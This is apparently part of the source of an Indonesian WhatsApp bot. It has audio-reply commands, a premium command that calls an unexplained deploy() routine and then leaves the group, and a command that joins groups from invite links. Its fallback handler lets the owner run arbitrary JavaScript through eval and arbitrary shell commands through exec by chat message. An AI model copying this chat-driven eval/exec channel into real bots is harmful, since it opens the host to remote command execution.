case 'gomenasai':
case 'hai-bot':
case 'hampa':
case 'hayo':
case 'hp-iphone':
case 'i-like-you':
case 'ih-wibu':
case 'india':
case 'kamu-nanya':
case 'karna-lo-wibu':
case 'kiss':
// case 'kontol':
case 'ku-coba':
case 'maju-wibu':
case 'makasih':
case 'mastah':
case 'menuasli':
case 'menuku':
case 'nande-nande':
case 'nani':
case 'ngadi-ngadi':
case 'nikah':
case 'nuina':
case 'omaga':
case 'onichan':
case 'owner-sange':
case 'ownerku':
case 'pak-sapardi':
case 'pale':
case 'pantek':
case 'pasi-pasi':
case 'punten':
case 'reza-kecap':
case 'sayang':
case 'siapa-sih':
case 'siren':
case 'siuu':
case 'subscribe':
case 'sudah-biasa':
case 'summertime':
case 'tanya-bapak-lu':
case 'to-the-bone':
case 'wajib':
case 'waku':
case 'woi':
case 'yamete':
case 'yowaimo':
case 'yoyowaimo':
case 'spam':
case 'welcome':
case 'intro':
case 'desah':
case 'kila':
case 'bugm':
case 'menukila':
case 'ketawakila':
case 'hai':
   if (db.data.chats[m.chat].autovn) {
dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/${command}.mp3`)
await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
break
case 'vrtxanu': {
	if (!isPremium) throw mess.premime
                deploy('hae')
await new Promise(resolve => setTimeout(resolve, 5000));
                 deploy('hehe')
                 await new Promise(resolve => setTimeout(resolve, 5000));
                m.reply('oce 😝')
await new Promise(resolve => setTimeout(resolve, 10000));
                await dica.groupLeave(m.chat)
                console.log('Bot berhasil keluar dari grup.')
            }
            break
case 'joingc':{
	dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/hai.mp3`)
	if (!isPremium) throw mess.premime
	m.reply('oke otw')
                if (!text) throw 'Link Grupnya mana?'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "1"
for (let i = 0; i < jumlah; i++) {
let kir = await dica.groupAcceptInvite(result)

let buttons = [
{ buttonId: 'vrtxanu', buttonText: { displayText: '👥OWNER' }, type: 1 }
]

if (kir) {
    dica.sendButtonText(kir, buttons, mess.jasher );
await dica.sendMessage(kir, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true });
    console.log("Bot berhasil masuk ke grup: " + kir)
m.reply('✅Done')
} else {
console.log("Gagal masuk ke grup")
m.reply('Gabisa Join 😌 ')
}
}
}
break ;
            default:
                if (budy.startsWith('=>')) {
                    if (!itsMeDica) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!itsMeDica) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!itsMeDica) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    dica.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})